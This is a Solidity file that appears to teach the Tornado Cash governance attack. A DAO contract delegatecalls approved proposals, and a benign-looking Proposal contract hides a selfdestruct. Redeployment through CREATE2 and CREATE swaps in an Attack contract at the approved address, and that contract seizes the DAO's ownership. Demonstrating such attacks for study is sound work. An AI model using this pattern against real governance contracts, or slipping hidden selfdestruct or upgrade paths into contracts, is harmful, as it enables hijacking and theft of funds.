// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract TornadoCashDAO {

    struct DAOProposal {
        address target;
        bool approved;
        bool executed;
    }

    address public owner = msg.sender;
    DAOProposal[] public proposals;

    // Function to approve an incoming proposal contract
    function approve(address target) external {
        require(msg.sender == owner, "not authorized");

        proposals.push(DAOProposal({target: target, approved: true, executed: false}));
    }

    // Function to execute the proposal upgrade
    function execute(uint256 proposalId) external payable {
        DAOProposal storage proposal = proposals[proposalId];
        require(proposal.approved, "not approved");
        require(!proposal.executed, "executed");

        proposal.executed = true;

        (bool ok, ) = proposal.target.delegatecall(
            abi.encodeWithSignature("executeProposal()")
        );
        require(ok, "delegatecall failed");
    }
}

// The innocent looking Proposal that passed a vote to be verified and approved.
contract Proposal {
    event Log(string message);
    // The function called from the `execute` function's delegatecall
    // Never actually used in `Proposal`, but used in `Attack`.
    function executeProposal() external {
        emit Log("Excuted code approved by DAO");
    }

    // Attacker somehow hid selfdestruct code via innocent looking function
    function emergencyStop() external {
        selfdestruct(payable(address(0)));
    }
}

// The malicious contract
contract Attack {
    event Log(string message);

    address public owner;

    // The function called from the `execute` function's delegatecall
    function executeProposal() external {
        emit Log("Excuted code not approved by DAO :)");
        // For example - set DAO's owner to attacker
        owner = msg.sender;
    }
}

contract DeployerUsingCreate2 {
    event Log(address addr);

    // Deploys the `DeployerUsingCreate` contract with `create2` methodology.
    function deploy() external {
        bytes32 salt = keccak256(abi.encode(uint(123)));
        address addr = address(new DeployerUsingCreate{salt: salt}());
        emit Log(addr);
    }
}

contract DeployerUsingCreate {
    event Log(address addr);

    // Deploys the `Proposal` contract
    function deployProposal() external {
        address addr = address(new Proposal());
        emit Log(addr);
    }

    // Deploys the `Attack` contract
    function deployAttack() external {
        address addr = address(new Attack());
        emit Log(addr);
    }

    // Self destructs the `DeployerUsingCreate`
    function kill() external {
        selfdestruct(payable(address(0)));
    }
}
